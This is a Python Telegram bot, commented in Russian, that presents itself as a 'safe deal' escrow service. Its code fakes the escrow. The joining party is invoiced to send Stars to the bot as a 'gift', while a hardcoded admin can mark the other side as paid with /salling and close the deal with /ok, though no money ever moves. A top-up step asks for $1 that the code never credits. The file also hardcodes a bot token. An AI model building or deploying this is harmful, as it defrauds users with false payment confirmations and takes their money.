import asyncio
import uuid
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, PreCheckoutQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram import F

# Замените на ваш токен бота
BOT_TOKEN = '8386284542:AAGBhArwt3E8gChPEXoNKkmUrrGG-osn3tQ'
# Замените на username вашего бота (без @)
BOT_USERNAME = 'Save_Deal_Bot'

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

class States(StatesGroup):
    waiting_amount = State()

# Глобальные хранилища (для примера, в production используйте БД)
balances = {}  # user_id: balance
deals_count = {}  # user_id: count
deals = {}  # deal_id: {'initiator': uid, 'partner': uid or None, 'amount': int, 'payment_initiator': bool, 'payment_partner': bool}
user_to_deal = {}  # uid: deal_id
last_deal = None  # Для простоты, предполагаем одну активную сделку за раз (для /salling без параметра)
admin_id = None  # Будет установлен при первом сообщении от админа

def get_or_init_user_data(uid: int):
    if uid not in balances:
        balances[uid] = 0
    if uid not in deals_count:
        deals_count[uid] = 0

async def show_menu(msg_or_cb: types.Message | types.CallbackQuery):
    if isinstance(msg_or_cb, types.CallbackQuery):
        msg = msg_or_cb.message
        await msg_or_cb.answer()
    else:
        msg = msg_or_cb
    uid = msg.from_user.id
    get_or_init_user_data(uid)
    balance = balances[uid]
    deal_n = deals_count[uid]
    text = f"Баланс 💰 :{balance}₽\nСделок 💳 :{deal_n}\n\nБот для проведения сделок в Telegram."
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="Пополнить 💸"), KeyboardButton(text="Начать сделку 🪙")]],
        resize_keyboard=True,
        one_time_keyboard=False
    )
    await msg.reply(text, reply_markup=kb)

async def send_status(uid: int, deal_id: str):
    if deal_id not in deals:
        return
    deal = deals[deal_id]
    initiator = deal['initiator']
    is_initiator = uid == initiator
    partner_paid = deal['payment_partner'] if is_initiator else deal['payment_initiator']
    self_paid = deal['payment_initiator'] if is_initiator else deal['payment_partner']
    status_emoji_self = '✅️' if self_paid else '❌️'
    status_emoji_partner = '✅️' if partner_paid else '❌️'
    status_text = f"Статус оплаты собеседника : {status_emoji_partner}\nВаш статус оплаты : {status_emoji_self}"
    await bot.send_message(uid, status_text)

async def send_star_invoice(chat_id: int, deal_id: str):
    prices = [LabeledPrice(label="Подарок за Stars", amount=1)]  # Минимальный 1 Star, пользователь может отправить больше если позволит UI
    await bot.send_invoice(
        chat_id=chat_id,
        title="Отправить подарок",
        description="Отправьте Stars как подарок для подтверждения оплаты в сделке.",
        payload=f"gift_{deal_id}",
        provider_token="",  # Пустая строка для Stars
        currency="XTR",
        prices=prices,
    )

@dp.message(Command('start'))
async def start_handler(msg: types.Message, state: FSMContext):
    args = msg.text.split(maxsplit=1)
    if len(args) > 1 and args[1].startswith('join_'):
        deal_id = args[1][5:]
        if deal_id in deals and deals[deal_id]['partner'] is None:
            deals[deal_id]['partner'] = msg.from_user.id
            user_to_deal[msg.from_user.id] = deal_id
            global last_deal
            last_deal = deal_id
            initiator = deals[deal_id]['initiator']
            await send_status(initiator, deal_id)
            await send_status(msg.from_user.id, deal_id)
            # Отправляем invoice партнеру для "подарка"
            await send_star_invoice(msg.from_user.id, deal_id)
            await msg.reply("Вы подключились к сделке. Чтобы подтвердить оплату, отправьте подарок (Stars) боту.")
        else:
            await msg.reply("Сделка не найдена или уже занята.")
    else:
        if msg.from_user.username == 'litenightstorm':
            global admin_id
            admin_id = msg.from_user.id
        await show_menu(msg)
    await state.clear()

@dp.message(Command('menu'))
async def menu_handler(msg: types.Message):
    if msg.from_user.username == 'litenightstorm':
        global admin_id
        admin_id = msg.from_user.id
    await show_menu(msg)

@dp.message(F.text == "Пополнить 💸")
async def replenish_handler(msg: types.Message):
    text = "Чтобы пополнить счет оплатите 1$ на счет http://t.me/send?start=IVUokMDdN2lF"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]]
    )
    await msg.reply(text, reply_markup=kb, reply=False)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_handler(cb: types.CallbackQuery):
    await show_menu(cb)

@dp.message(F.text == "Начать сделку 🪙")
async def start_deal_handler(msg: types.Message, state: FSMContext):
    await state.set_state(States.waiting_amount)
    await msg.reply("На сколько рублей будет идти сделка?")

@dp.message(States.waiting_amount)
async def set_amount_handler(msg: types.Message, state: FSMContext):
    try:
        amt = int(msg.text.replace('₽', '').replace(',', '').strip())
        if amt <= 0:
            raise ValueError
    except ValueError:
        await msg.reply("Введите положительное число (например, 200).")
        return
    global last_deal
    deal_id = str(uuid.uuid4())
    deals[deal_id] = {
        'initiator': msg.from_user.id,
        'partner': None,
        'amount': amt,
        'payment_initiator': False,
        'payment_partner': False
    }
    last_deal = deal_id
    user_to_deal[msg.from_user.id] = deal_id
    link = f"https://t.me/{BOT_USERNAME}?start=join_{deal_id}"
    text = f"Ожидайте подключение собеседника, ваша ссылка: {link}"
    await msg.reply(text)
    await state.clear()

@dp.message(Command('salling'))
async def salling_handler(msg: types.Message):
    if msg.from_user.username != 'litenightstorm':
        await msg.reply("Доступ только для @litenightstorm.")
        return
    global admin_id
    admin_id = msg.from_user.id
    global last_deal
    if last_deal is None or last_deal not in deals:
        await msg.reply("Нет активной сделки.")
        return
    deals[last_deal]['payment_initiator'] = True
    initiator = deals[last_deal]['initiator']
    partner = deals[last_deal]['partner']
    if partner:
        await send_status(initiator, last_deal)
        await send_status(partner, last_deal)
        await msg.reply("Статусы обновлены.")
    else:
        await msg.reply("Сделка еще не подключена партнером.")

@dp.message(Command('ok'))
async def ok_handler(msg: types.Message):
    if msg.from_user.username != 'litenightstorm':
        return
    global admin_id
    admin_id = msg.from_user.id
    global last_deal
    if last_deal is None or last_deal not in deals:
        await msg.reply("Нет активной сделки.")
        return
    deal = deals[last_deal]
    initiator = deal['initiator']
    partner = deal['partner']
    if partner is None:
        await msg.reply("Партнер не подключен.")
        return
    # Завершаем сделку
    deals_count[initiator] = deals_count.get(initiator, 0) + 1
    deals_count[partner] = deals_count.get(partner, 0) + 1
    # Здесь можно добавить логику обновления баланса, например:
    # balances[initiator] += deal['amount']  # или что-то подобное, но не указано
    del deals[last_deal]
    user_to_deal.pop(initiator, None)
    user_to_deal.pop(partner, None)
    last_deal = None
    await bot.send_message(initiator, "Сделка успешно завершена!")
    await bot.send_message(partner, "Сделка успешно завершена!")
    await msg.reply("Сделка завершена.")

@dp.pre_checkout_query()
async def pre_checkout_query_handler(query: PreCheckoutQuery):
    await query.answer(ok=True)

@dp.message(F.successful_payment)
async def successful_payment_handler(msg: types.Message):
    payment = msg.successful_payment
    if payment.currency != "XTR":
        return
    payload = payment.invoice_payload
    if payload.startswith("gift_"):
        deal_id = payload[5:]
        if deal_id in deals and deals[deal_id]['partner'] == msg.from_user.id:
            deals[deal_id]['payment_partner'] = True
            await send_status(deals[deal_id]['initiator'], deal_id)
            await send_status(msg.from_user.id, deal_id)
            global admin_id
            if admin_id:
                await bot.send_message(admin_id, f"Боту скинули подарок: {payment.total_amount} Stars в сделке {deal_id}")
        await msg.reply(f"Спасибо за подарок! {payment.total_amount} Stars получено. Ожидайте завершения сделки.")

# Игнорируем другие сообщения или обрабатываем как текст (не обязательно)
@dp.message()
async def unknown(msg: types.Message):
    await msg.reply("Используйте /menu для меню или кнопки.")

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())